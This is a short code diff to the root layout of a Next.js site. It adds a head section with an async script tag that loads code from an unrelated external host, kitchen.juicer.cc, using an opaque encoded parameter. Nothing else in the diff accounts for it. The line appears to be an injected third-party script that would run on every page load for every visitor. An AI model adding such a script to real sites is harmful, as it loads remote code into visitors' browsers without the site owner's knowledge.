@@ -45,6 +45,9 @@ export default async function RootLayout(props: { children: React.ReactNode }) {
 
   return (
     <html lang="ja">
+      <head>
+        <script src="//kitchen.juicer.cc/?color=s110owz4x8Y=" async></script>
+      </head>
       <body>
         <Header />
         <main>{children}</main>
